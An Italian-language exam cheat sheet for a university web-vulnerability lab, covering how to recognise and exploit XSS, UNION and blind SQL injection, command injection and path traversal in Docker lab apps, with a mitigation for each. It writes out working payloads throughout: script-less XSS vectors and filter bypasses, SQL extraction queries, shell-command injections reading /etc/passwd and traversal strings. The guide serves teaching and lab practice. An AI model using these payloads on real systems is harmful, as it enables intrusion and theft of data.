# Guida Esame — Web Vulnerabilities

> File cockpit da aprire il giorno dell'esame appena riconosci un esercizio di questo tipo (una
> **web app** in un container docker — `docker run ... -p ...:5000` o `:8000` — da testare **solo con
> browser/curl**, di solito con `payload.png`/`exploitN.png` + `web.txt` da consegnare, spesso con
> l'obiettivo di **esfiltrare una flag** o **eseguire un `alert()`**). Autosufficiente per la maggior
> parte dei casi. Per l'algoritmo passo-passo vedi `procedura_operativa_web.md`; per i 5 casi reali
> già risolti, `modello_web_vulnerabilities.md`; per il template del deliverable, `template_report_web.md`.
>
> **Principio guida**: davanti a un input controllabile, la domanda non è "quale exploit conosco?" ma
> **"a quale interprete arriva questo input?"** (HTML del browser, SQL, shell, filesystem). Lo scopri
> mandando input che romperebbero *ciascun* interprete e guardando la reazione (Sezione 1). Una volta
> saputo l'interprete, la famiglia è decisa e il resto è meccanico.

---

## 0. I gate che NON hai il permesso di saltare

- ⚠️ **Gate A — niente scanner, niente bruteforce.** In (quasi) ogni consegna: *"Non è possibile
  utilizzare tool di scansione automatica e non è consentito alcun tipo di bruteforce."* Vale come
  **vincolo generale del tipo d'esame**, non del singolo esercizio (confermato su tutti e 5 i casi
  del pool, con lievi variazioni di formula). Quindi **niente sqlmap, nikto, dirb, gobuster, wfuzz,
  hydra**. Solo browser, inspector (DevTools), curl, e — dove serve comporre una richiesta a mano —
  Burp/proxy. L'exploit va **ragionato**, non forzato.
- ⚠️ **Gate B — la prova è visiva.** Il voto dipende dagli screenshot + dal livello di dettaglio del
  `web.txt` ("il livello di dettaglio e precisione della descrizione sarà utilizzato come
  valutazione"). Cattura **ogni passaggio fondamentale** (classificazione, ostacolo, bypass,
  successo), non solo il risultato finale. Se la VM fa revert, salva gli screenshot sull'host mentre
  procedi (vedi memoria `deliverable_vm_revert`).
- ⚠️ **Gate C — leggi TUTTA la pagina prima di sparare payload.** Molte app d'esame **mostrano
  indizi**: la command line eseguita (Caso 4), un link alla documentazione dello schema (Caso 5), un
  suggerimento sul formato dell'input (Caso 3, "base64"). Il primo passo è **leggere**, non iniettare.

---

## 1. TRIAGE — a quale interprete arriva l'input? (l'albero decisionale)

Individua **l'input controllabile** (parametro GET nell'URL `?x=...`, campo POST, campo di ricerca,
dropdown). Poi manda, uno alla volta, questi input-sonda e osserva la reazione. **Ogni sonda rompe un
interprete diverso**: la reazione ti dice quale.

| Sonda | Se provoca... | Interprete probabile → Famiglia |
|---|---|---|
| `<b>test</b>` o `<img src=x onerror=alert(1)>` | il **grassetto compare** / parte un alert / il tag è interpretato | l'output è **riflesso nell'HTML** → **XSS** |
| `'` (apice singolo) | **errore SQL** / la pagina cambia / più righe del previsto | l'input compone una **query SQL** → **SQL Injection** |
| `;` `|` `` ` `` `$(...)` `#` | **errore shell** / output di un comando / la command line mostrata cambia | l'input compone una **riga di comando** → **Command Injection** |
| `../` o `/etc/passwd` o `../../../../etc/passwd` | compare il **contenuto di un file** / errore "file not found" con un path | l'input compone un **percorso di file** → **Path Traversal / LFI** |
| nome di file/record valido → poi lo stesso ma inesistente | messaggio d'errore che **rivela un path** o una query | conferma path/SQL a seconda dell'errore |

**Regole di lettura del triage:**

1. **Parti dallo scenario più veloce da verificare.** Il web.txt ufficiale del Caso 3 lo dice
   esplicitamente: se l'input "ritorna solo quanto inserito" (riflesso) e non altri dati recuperati,
   SQLi è improbabile → prova prima XSS. Se l'app *mostra il comando eseguito* → command injection.
   Se l'app *apre/mostra file* → path traversal.
2. **La consegna spesso ti dà la famiglia (o la esclude).** Frasi-chiave:
   - *"vulnerabilità Client Side"* / *"eseguire un alert o prompt"* → **XSS** (Casi 1, 3).
   - *"siti che interrogano database"* / *"esfiltrare le flag nel database"* → **SQL Injection** (Caso 5).
   - *"Server Side ... non sono coinvolti database"* → **Path Traversal o Command Injection** (Casi 2, 4).
     Distingui i due: *legge un file* (file/doc browser) → traversal; *esegue e mostra un comando*
     (finder/search) → command injection.
   - *"identificare il tipo di vulnerabilità"* (Caso 3) → NON te la dà, la sonda del punto 1 decide.
3. **Il nome dell'immagine docker è un indizio forte**: `vuln-decoder` (decodifica → riflette → XSS),
   `vuln-finder` (`find` → command injection), `vuln-file-browser` (apre file → path traversal),
   `union.sh` (UNION → SQLi UNION-based).

---

## 2. Ramo XSS (Cross-Site Scripting)

**Riconoscimento**: il tuo input **ricompare nella pagina** (riflesso). Con `<b>test</b>` il testo
diventa grassetto = i tag NON sono HTML-encoded.

**Exploit passo-passo:**
1. Conferma la riflessione senza encoding: `?name=<b>x</b>` → grassetto.
2. Prova il payload classico: `<script>alert("vuln")</script>`.
3. **Se `<script>` è bloccato/filtrato** (ritorna "error", o sparisce): NON mollare. Il filtro quasi
   sempre colpisce solo la stringa `script`. Vettori **script-less** che eseguono JS:
   - `<img src=x onerror="alert(1)">` ← il più usato nel pool (Casi 1 e 3)
   - `<svg onload="alert(1)">`
   - `<body onload="alert(1)">`
   - `<a href="javascript:alert(1)">click</a>` (richiede click, meno preferito)
4. Bypass di filtri sulla parola `script` (se proprio serve `<script>`): prova `<ScRiPt>` (molti
   filtri sono case-sensitive) o `<scr<script>ipt>` (se la sostituzione non è ricorsiva, il `script`
   interno viene tolto e i pezzi si richiudono in `<script>`).
5. **Ostacoli lato client** (limite `maxlength`, ecc.): sono difese **finte**. Aggirali con
   l'inspector (rimuovi `maxlength` dal DOM) o inviando la richiesta a mano (Burp/curl) senza passare
   dal campo HTML.
6. **Involucri**: se l'app decodifica l'input prima di rifletterlo (es. base64, Caso 3), **codifica**
   il payload nello stesso formato prima di inviarlo.
7. Prova = screenshot dell'**alert nativo** del browser sopra la pagina.

**Prima di sparare il payload: DOVE finisce il tuo input?** (il contesto di riflessione decide la
sintassi). I casi del pool riflettono l'input nel **corpo HTML** (`Hello <INPUT>`), dove `<img
onerror>` va da sé. Ma una variante può riflettere l'input **dentro un attributo** o **dentro uno
script**, e lì il payload cambia. Guarda il **view-source** (o l'inspector) e cerca dove ricompare una
stringa-sonda univoca (es. `zzz123`):
- **Nel corpo HTML** (`...>Hello zzz123<...`): caso standard → inietti direttamente il tag,
  `<img src=x onerror=alert(1)>`.
- **Dentro un attributo** (`<input value="zzz123">` o `<img alt='zzz123'>`): sei **dentro le
  virgolette** di un attributo — un `<tag>` lì è solo testo. Devi prima **uscire** dall'attributo e
  dal tag (breakout): chiudi la virgoletta e il `>`, poi apri il tuo tag →
  `"><img src=x onerror=alert(1)>` (se l'attributo è fra apici doppi) o `'><svg onload=alert(1)>` (se
  fra apici singoli). Guarda nel source **quale virgoletta** racchiude l'input e usa quella.
- **Dentro un contesto JavaScript** (`<script>var x='zzz123';</script>`): sei **dentro una stringa
  JS** — non serve nessun tag, ti basta **chiudere la stringa e iniettare codice**:
  `';alert(1)//` → diventa `var x='';alert(1)//';` (il `//` commenta la coda). Se sei fra apici
  doppi, `";alert(1)//`. Qui `<img>`/`<svg>` **non** servono (non sei in contesto HTML): il canale è
  già JS, sfruttalo diretto.

Regola: **il contesto (body / attributo / JS) si legge nel source, e detta il payload.** Sbagliare
contesto è la causa n.1 di "il payload sembra non funzionare" in una XSS che invece è sfruttabile.

**Mitigazione (per il `web.txt`)**: output encoding (HTML entity per `< > " ' &`) di ogni input
riflesso; whitelist dei caratteri ammessi lato server; CSP restrittiva che vieti script inline. (Nota:
l'encoding corretto **dipende dal contesto** — HTML-entity nel body, escaping degli apici/`<>`
nell'attributo, JS-string-escaping in uno script: un input riflesso in più contesti va encodato per
ciascuno.)

---

## 3. Ramo SQL Injection

**Riconoscimento**: input in un contesto "database" (directory/lista/ricerca di record); `'` provoca
errore o cambia il numero di righe.

**Prima biforcazione — l'output è riflesso o no?** Appena confermi che tocchi SQL, decidi *subito*
quale ramo: se i **dati recuperati compaiono nella pagina** (le righe della directory, un campo
mostrato) → **UNION-based**, qui sotto. Se l'app ti dà solo un **esito** ("trovato/non trovato",
pagina diversa) e non i dati → è **BLIND**: salta a **§3-bis**, UNION non serve. Il test lampo è al
punto 1 di §3-bis (`' UNION select 'AAAA' --` → `AAAA` appare o no?).

**Exploit passo-passo (UNION-based, la tecnica del pool — Caso 5):**
1. Conferma: `?id=X' OR '1'='1` (+ `--` se serve chiudere) → tornano **tutte** le righe. Prova che
   l'iniezione funziona.
2. **Conta le colonne** della query originale (obbligatorio per UNION):
   - `?id=X' UNION select NULL,NULL,... --` aggiungendo NULL finché **sparisce l'errore**, **oppure**
   - `?id=X' ORDER BY 1--`, `ORDER BY 2--`, ... finché **dà** errore (ultimo valido = n. colonne).
3. **Trova quali colonne sono visibili** a schermo: metti stringhe/`sqlite_version()` al posto dei
   NULL e guarda quali compaiono. Piazza i dati da leggere nelle posizioni visibili.
4. **Enumera le tabelle** dalla tabella di metadati del **DBMS giusto**:
   - SQLite → `sqlite_schema` (o `sqlite_master`): `UNION select type,name,tbl_name,NULL from sqlite_schema --`
   - MySQL/MariaDB → `information_schema.tables` / `information_schema.columns`
   - PostgreSQL → `information_schema.tables` / `pg_tables`
   - Oracle → `all_tables` / `all_tab_columns`
5. **Estrai** dalla tabella interessante: `?id=X' UNION select * from flags --` (o elencando le
   colonne trovate al punto 4).
6. Prova = screenshot con l'URL della query iniettata e le flag mostrate.

### 3-bis. Variante BLIND (cieca) — quando l'output NON è riflesso a schermo

> ⚠️ **Perché questa sotto-sezione esiste**: i 5 casi del pool sono tutti UNION-based, cioè
> presuppongono che i dati estratti **compaiano nella pagina** (le righe della directory, gli
> Address con le flag). Ma una variante d'esame plausibile è una **SQLi cieca**: l'app interroga il
> DB ma **non riflette il risultato** — mostra solo un esito binario ("utente trovato" / "nessun
> utente"), o una pagina diversa, o (peggio) solo un tempo di risposta diverso. Qui **UNION non
> serve a niente**: puoi anche accodare la tua query, ma il suo output non viene stampato da nessuna
> parte. La flag va estratta **un bit alla volta**, facendo al database domande **sì/no**. Questo è
> materiale didattico (non uno dei 5 casi ufficiali), ma il meccanismo è quello standard.

**Riconoscimento — è blind quando:**
1. `'` provoca comunque un cambiamento (errore, o l'esito cambia) → l'input **tocca SQL** (come nel
   ramo normale), MA
2. per quanto tu inietti, **non riesci a far comparire dati arbitrari** nella pagina: l'app risponde
   sempre con lo **stesso schema fisso** (un messaggio "trovato/non trovato", un conteggio, un
   redirect, una pagina che c'è o non c'è), non con il **contenuto** delle righe.
3. La spia decisiva: `' UNION select 'AAAA' -- ` **non fa apparire `AAAA` da nessuna parte**, ma la
   pagina reagisce lo stesso (cambia trovato↔non trovato). Se `AAAA` **comparisse**, saresti nel caso
   UNION normale (§3 sopra) e questa sotto-sezione non ti serve.

**L'oracolo**: in una SQLi cieca l'app diventa un **oracolo booleano**. Tu costruisci una condizione
vera/falsa sul dato segreto, e l'app ti dice — indirettamente — se è vera. Serve un **segnale
osservabile** che distingua VERO da FALSO. In ordine di comodità:

| Segnale osservabile | Tecnica da usare |
|---|---|
| L'esito **cambia** (trovato/non trovato, pagina A/pagina B, redirect sì/no, lunghezza risposta diversa) | **Boolean-based blind** |
| L'esito è **sempre identico**, ma puoi far **variare il tempo di risposta** | **Time-based blind** (ultima spiaggia) |

---

#### 3-bis.a — Boolean-based blind

**Passo 1 — conferma che l'iniezione è booleana.** Manda due payload che differiscono solo per una
condizione vera vs falsa e verifica che l'app risponde **in modo diverso**:

```
?id=Alice' AND 1=1--      → "utente trovato"     (condizione VERA)
?id=Alice' AND 1=2--      → "nessun utente"      (condizione FALSA)
```

Se le due risposte sono **diverse**, hai un oracolo: l'app ti sta dicendo "la condizione dopo AND è
vera/falsa". (Se l'input è dentro un literal fra apici, puoi anche bilanciare gli apici senza
commento: `Alice' AND '1'='1` vs `Alice' AND '1'='2` — stesso effetto, comodo quando `--` fa i
capricci, vedi §4.7 di `procedura_operativa_web.md`.) **Questo è il gate**: da qui in poi ogni domanda
al DB ha questa forma — cambi solo la condizione dopo `AND`.

**Passo 2 — orientati: quale dato voglio e da dove.** Come nel ramo UNION devi sapere *cosa* leggere.
Puoi porre domande booleane anche sui **metadati** per scoprirlo, una alla volta:

```
# esiste una tabella che si chiama 'flags'? (SQLite)
?id=Alice' AND (SELECT count(*) FROM sqlite_schema WHERE name='flags')=1--
   → trovato = sì, esiste.
```

**Passo 3 — trova la LUNGHEZZA del dato** (ti serve per sapere quando fermarti). Ricerca binaria sul
numero, non a tentoni:

```
?id=Alice' AND length((SELECT password FROM users LIMIT 1))>8--    → falso  ⇒ len ≤ 8
?id=Alice' AND length((SELECT password FROM users LIMIT 1))>4--    → vero   ⇒ len ≥ 5
?id=Alice' AND length((SELECT password FROM users LIMIT 1))=6--    → vero   ⇒ len = 6
```

**Passo 4 — estrai un carattere alla volta** con `substr()`. Due modi:

*Modo A — scansione lineare (semplice da capire):* per la posizione `i`, provi ogni carattere
dell'alfabeto candidato finché l'app dice "vero":

```
?id=Alice' AND substr((SELECT password FROM users LIMIT 1),1,1)='a'--   → falso
?id=Alice' AND substr((SELECT password FROM users LIMIT 1),1,1)='b'--   → falso
...
?id=Alice' AND substr((SELECT password FROM users LIMIT 1),1,1)='c'--   → VERO  ⇒ 1° char = 'c'
```
Semplice ma lento: fino a ~95 richieste per carattere.

*Modo B — ricerca binaria sul codice ASCII (quello da usare):* invece di indovinare il carattere,
**dimezzi** ogni volta l'intervallo dei codici (32–126 = caratteri stampabili) confrontando il
**codepoint** con `unicode()` (SQLite) / `ascii()` o `ord()` (MySQL):

```
?id=Alice' AND unicode(substr((SELECT password FROM users LIMIT 1),1,1))>79--
```
VERO → il codice sta nella metà alta; FALSO → metà bassa. **~7 richieste per carattere** invece di 95.

**Algoritmo completo (bisezione, pseudo-passi):**
```
L = lunghezza trovata al Passo 3
per ogni posizione i da 1 a L:
    lo = 32 ; hi = 126
    finché lo < hi:
        mid = (lo + hi) / 2                 # divisione intera
        chiedi:  unicode(substr(SEGRETO,i,1)) > mid
        se VERO:  lo = mid + 1              # il char sta sopra mid
        se FALSO: hi = mid                  # il char sta a mid o sotto
    carattere_i = chr(lo)                   # (mentalmente: il carattere con quel codice)
ricomponi carattere_1 … carattere_L
```

**Nota sui costrutti per DBMS** (il substr è quasi ovunque, il resto cambia):
- estrazione carattere: `substr(str, pos, 1)` — SQLite **e** MySQL; su MySQL anche `substring()` / `mid()`.
- codice del carattere: SQLite `unicode(c)`; MySQL `ascii(c)` o `ord(c)`.
- lunghezza: `length()` (SQLite) / `length()`/`char_length()` (MySQL).
- concatenazione (se serve): SQLite `a||b`; MySQL `concat(a,b)`.
- selezione della riga giusta: `... LIMIT 1 OFFSET n` per scorrere le righe una a una.

---

#### 3-bis.b — Time-based blind (quando NON c'è nemmeno una risposta binaria)

Quando l'app risponde **sempre allo stesso identico modo** a vero e a falso (nessun "trovato/non
trovato", nessuna differenza di pagina o di lunghezza), l'unico canale che ti resta è il **tempo**:
fai in modo che la query **ci metta di più** se la condizione è vera, e **misuri** il ritardo.

- **MySQL / MariaDB**: c'è `SLEEP()`. Conferma dell'iniezione: `?id=Alice' AND sleep(5)-- ` — se la
  pagina ci mette ~5 s in più, è iniettabile. Estrazione condizionata:
  `?id=Alice' AND IF(unicode(substr((SELECT password FROM users LIMIT 1),1,1))>79, sleep(3), 0)-- `
  → se risponde lento, la condizione è vera. Poi stessa bisezione del Modo B, ma il segnale "VERO" è
  "ha risposto lento" invece di "trovato".

- **SQLite — attenzione, NON ha `SLEEP()`** (né alcuna funzione di pausa nativa). Verificato: il
  time-based su SQLite si fa con una **heavy query**, cioè un'operazione volutamente costosa che
  brucia tempo CPU. Il costrutto standard usa `randomblob()` (genera N byte casuali) dentro `hex()` +
  `like()` per forzare un calcolo pesante:
  ```
  ?id=Alice' AND CASE WHEN (unicode(substr((SELECT password FROM users LIMIT 1),1,1))>79)
       THEN like('a', upper(hex(randomblob(100000000)))) ELSE 0 END--
  ```
  Se la condizione è vera, SQLite deve generare ~100 MB casuali, esadecimalizzarli e fare un `like`
  su una stringa enorme → ritardo di secondi misurabile; se è falsa, ritorna subito. Aumenta/riduci
  il numero di byte per tarare il ritardo (`randomblob(1000000)` ≈ mezzo secondo, `100000000` ≈
  parecchi secondi).
  ⚠️ **Onestà operativa per l'esame**: il pool è **SQLite** e la prova va fatta **a mano** (niente
  sqlmap, Gate A). Estrarre una stringa carattere-per-carattere a colpi di heavy query cronometrate a
  mano è **lentissimo e fragile**. Perciò, su questo tipo d'esame, il time-based è davvero l'**ultima
  spiaggia**: prima **cerca meglio un oracolo booleano** (una differenza di pagina, di messaggio, di
  lunghezza della risposta anche minima) — quasi sempre c'è. Se lo trovi, usa il boolean-based
  (3-bis.a), molto più pratico da eseguire manualmente.

---

#### 3-bis.c — Quando scegliere quale tecnica (albero di decisione SQLi)

```
L'input tocca SQL (l'apice ' cambia qualcosa)?
│
├─ NO  → non è SQLi, torna al triage §1.
│
└─ SÌ → riesco a far COMPARIRE dati arbitrari nella pagina?
        (test: ' UNION select 'AAAA',... --  →  'AAAA' appare?)
        │
        ├─ SÌ, i dati si vedono            → UNION-based        (§3, la via maestra del pool)
        │
        └─ NO, la pagina non stampa i dati → è BLIND. Che segnale ho?
                │
                ├─ l'ESITO cambia (trovato/non trovato,
                │  pagina A/B, redirect, lunghezza diversa) → Boolean-based  (§3-bis.a)  ← preferito
                │
                └─ l'esito è sempre identico, ma posso
                   far variare il TEMPO di risposta        → Time-based     (§3-bis.b)  ← ultima spiaggia
                                                              (su SQLite: heavy query, no SLEEP)
```

Regola sintetica: **vedo i dati → UNION; vedo una differenza sì/no → boolean; non vedo niente tranne
il cronometro → time-based.**

---

#### 3-bis.d — Esempio lavorato end-to-end (didattico, NON un caso del pool)

> Scenario inventato a scopo illustrativo: una "People Directory" come il Caso 5, ma che **non mostra
> le righe** — risponde solo **"Utente trovato"** oppure **"Nessun utente"**. Backend SQLite.
> Obiettivo: estrarre una flag breve, `flag = "cat"` (3 caratteri), dalla tabella `flags`. Serve a
> vedere il **procedimento concreto**; i valori sono inventati.

**1) Conferma oracolo booleano:**
```
?id=Alice' AND 1=1--   → "Utente trovato"    (VERO)
?id=Alice' AND 1=2--   → "Nessun utente"     (FALSO)
```
Risposte diverse ⇒ ho l'oracolo: "trovato" = condizione vera, "nessun utente" = falsa.

**2) Lunghezza della flag** (bisezione sul numero):
```
?id=Alice' AND length((SELECT val FROM flags LIMIT 1))>4--   → Nessun utente   ⇒ len ≤ 4
?id=Alice' AND length((SELECT val FROM flags LIMIT 1))>2--   → Utente trovato  ⇒ len ≥ 3
?id=Alice' AND length((SELECT val FROM flags LIMIT 1))=3--   → Utente trovato  ⇒ len = 3
```

**3) 1° carattere** — bisezione sul codice ASCII (intervallo 32–126). Il segreto è `'c'` = codice 99;
guarda come l'oracolo mi ci porta senza che io lo sappia in anticipo:
```
unicode(substr(flag,1,1)) > 79 ?  → trovato (VERO)   ⇒ lo=80  hi=126
                          > 103 ? → nessuno (FALSO)  ⇒ lo=80  hi=103
                          > 91 ?  → trovato (VERO)   ⇒ lo=92  hi=103
                          > 97 ?  → trovato (VERO)   ⇒ lo=98  hi=103
                          > 100 ? → nessuno (FALSO)  ⇒ lo=98  hi=100
                          > 99 ?  → nessuno (FALSO)  ⇒ lo=98  hi=99
                          > 98 ?  → trovato (VERO)   ⇒ lo=99  hi=99   STOP
```
`lo == hi == 99` → codice 99 → carattere **'c'**. (7 richieste.) Ogni richiesta è, per esteso:
`?id=Alice' AND unicode(substr((SELECT val FROM flags LIMIT 1),1,1))>79--` ecc.

**4) 2° e 3° carattere** — stessa bisezione cambiando l'indice di `substr(...,2,1)` e `substr(...,3,1)`:
si ottengono codice 97 = **'a'** e codice 116 = **'t'**.

**5) Ricomposizione**: `c` + `a` + `t` = **`cat`**. Flag estratta con ~3 + 7·3 ≈ 24 richieste
sì/no, senza mai vedere il dato stampato: l'ho **dedotto** dalle sole risposte "trovato/non trovato".

**Cosa consegnare** (deliverable): NON esiste uno screenshot di "output esfiltrato" come nel ramo
UNION. La prova è la **sequenza di richieste/risposte** che dimostra il canale booleano: cattura
almeno (a) i due screenshot `AND 1=1` vs `AND 1=2` con le due risposte diverse (la prova che l'oracolo
esiste), (b) un paio di richieste di estrazione con l'esito, (c) la stringa finale ricostruita. Vedi
`template_report_web.md` per come strutturare il `web.txt` di una blind. Documenta l'**algoritmo**
(bisezione) nel `web.txt`: è esattamente il tipo di "ragionamento" che vale il voto.

**Come sapere il DBMS**: indizi nella pagina/consegna ("formato sqlite" nel Caso 5), messaggi
d'errore, o quale sintassi di commento/funzione funziona.

**Mitigazione (per il `web.txt`)**: prepared statement / bind variables (PREPARE) — il fix vero;
in subordine whitelist dei valori ammessi del parametro; input validation che vieti i metacaratteri SQL.

---

## 4. Ramo Command Injection

**Riconoscimento**: app "server-side, no database" che **esegue un comando** (finder, search, ping,
convert, ...) — spesso **mostra la command line** eseguita ("Command run: ..."). `;`/`|`/`` ` `` nel
tuo input cambiano l'output o generano errore shell.

**Exploit passo-passo (Caso 4):**
1. Inserisci un pattern innocuo (`ANF`) e **guarda dove finisce il tuo input** nella command line
   mostrata, e **cosa gli sta attaccato dopo** (es. `<INPUT>\*.pem 2>/dev/null`).
2. **Neutralizza la coda del comando** con un commento shell `#`: tutto ciò dopo `#` è ignorato.
3. **Concatena il tuo comando** con un separatore: `;` (esegue sempre), `&&` (se il primo riesce),
   `|` (pipe). Esempio in due tempi:
   - Scoperta: `flag.txt #` → trova il percorso del file.
   - Esfiltrazione: `flag.txt ; cat /percorso/trovato/flag.txt #`
4. Se non conosci il percorso della flag, **prima scoprilo** (usa il comando nativo dell'app, es.
   `find`, o inietta `; ls -R / ...`), **poi** leggilo. Il percorso è spesso randomizzato per container.
5. Altri comandi utili una volta dentro: `; id #`, `; cat /etc/passwd #`, `; ls -la /tmp #`.
6. Prova = screenshot con il payload nel campo, la command line risultante, e l'output (la flag).

**Mitigazione (per il `web.txt`)**: non costruire command line con input utente — usare librerie/API
native (es. la funzione di ricerca file del linguaggio) che non passano da una shell; se inevitabile,
whitelist di pattern ammessi + escaping dei metacaratteri shell + esecuzione senza shell (`execve`
con argomenti separati, non `system()`).

---

## 5. Ramo Path Traversal / LFI

**Riconoscimento**: app che **apre/mostra un file** indicato per nome/percorso (file browser, viewer,
`?page=`, `?file=`, `?path=`, download). Server-side, no database. Obiettivo tipico: leggere un file
fuori dalla cartella prevista (`/tmp/flag.txt`, `/etc/passwd`).

**Exploit passo-passo (Caso 2 — ricostruito; metodo confermato dal lab S3):**
1. Individua il parametro che sceglie **quale file** viene letto.
2. Conferma che è un path reale: un nome inesistente → errore con un percorso.
3. **Risali le directory** con `../` fino alla radice, poi punta al bersaglio:
   `?file=../../../../../tmp/flag.txt`. **Aumenta il numero di `../` incrementalmente** finché
   funziona (in eccesso è innocuo: `/` non ha padre). Nel lab S3 servivano **5** livelli per DVWA.
4. Se l'app accetta percorsi assoluti: prova direttamente `?file=/tmp/flag.txt`.
5. **Se `../` è filtrato**: percorso assoluto; doppia URL-encoding (`%2e%2e%2f`); `....//` (dopo la
   rimozione di un `../` interno torna `../`); null byte `%00` (su stack vecchi).
6. Prova = screenshot con l'URL/payload e il contenuto del file mostrato.

**Mitigazione (per il `web.txt`)**: canonicalizzare il percorso (realpath) e verificare che resti
dentro la base dir; whitelist di file ammessi o id numerico mappato server-side; minimo privilegio
del processo web.

---

## 6. Confronti che salvano il colpo (i bivi tra famiglie che si somigliano)

- **XSS vs "sito non vulnerabile"**: `<script>` bloccato NON chiude la pista XSS — prova `<img onerror>`.
- **SQLi vs Command Injection**: entrambe spezzano un linguaggio interpolato. Distingui dal
  **carattere** che ha effetto (`'`/`--`/`UNION` → SQL; `;`/`|`/`` ` ``/`#` → shell) e dal **contesto**
  (directory/record → SQL; finder/ping/convert → shell).
- **Path Traversal vs Command Injection**: entrambe server-side senza DB. *Legge un file* → traversal;
  *esegue un comando* → command injection. Il segnale forte: l'app mostra la **command line** → CI.
- **XSS riflesso vs stored**: nel pool sono tutti **riflessi** (payload nell'URL/POST, effetto
  immediato). Se il payload venisse **salvato** dal server (commento, nome profilo, messaggio,
  guestbook) e **ricomparisse da solo** ricaricando la pagina — anche senza rimandare l'input —
  sarebbe **stored**. Come cambiano i passi operativi: (1) **riconoscimento**: dopo aver inviato il
  payload una volta, **ricarica la pagina "pulita"** (senza il parametro nell'URL) o riapri la
  sezione — se l'`alert` riscatta comunque, è persistente. (2) **prova/deliverable**: NON è un URL da
  condividere (quello è il tratto del reflected); è la **persistenza** — screenshot dell'alert che
  parte **al semplice caricamento** della pagina, idealmente da una **sessione/scheda diversa** (o
  descrivendo che scatterebbe per *qualunque* altro utente che visita la pagina), a dimostrare che il
  payload vive nel server e colpisce le vittime senza che clicchino un link preparato. (3) La
  **mitigazione** è la stessa (output encoding in fase di visualizzazione), ma sottolinea che
  l'impatto è maggiore: colpisce ogni visitatore, non solo chi apre un link malevolo.
- **SQLi UNION vs blind**: entrambe partono dall'apice `'` che tocca SQL. Le distingui con **un solo
  test**: `' UNION select 'AAAA',... -- ` fa **comparire `AAAA`** nella pagina? Sì → UNION-based
  (§3, i dati si leggono a schermo). No, ma la pagina reagisce lo stesso (trovato/non trovato, pagina
  diversa) → **blind boolean** (§3-bis): la flag si estrae carattere-per-carattere con `substr()` +
  domande sì/no. Nessuna differenza osservabile tranne il tempo → **blind time-based** (su SQLite:
  heavy query con `randomblob`, niente `SLEEP`). Non insistere con UNION se l'output non è riflesso:
  passa al ramo blind.
- **Difesa client-side (`maxlength`, dropdown, JS validation) vs server-side (filtro sulla stringa)**:
  la prima si bypassa banalmente (inspector/POST diretto), la seconda va aggirata nel contenuto del
  payload. Non confonderle: sono ostacoli **indipendenti**, affrontane uno alla volta.

---

## 7. Deliverable

- `payload.png` / `exploitN.png` (o `queryN.png`): numera gli screenshot; copri classificazione →
  ostacolo → bypass → successo.
- `web.txt`: struttura **VULNERABILITÀ / PASSI ESEGUITI / MITIGAZIONE** (+ contenuto flag se
  richiesto). Template pronto in `template_report_web.md`. Il livello di dettaglio **è** il voto.
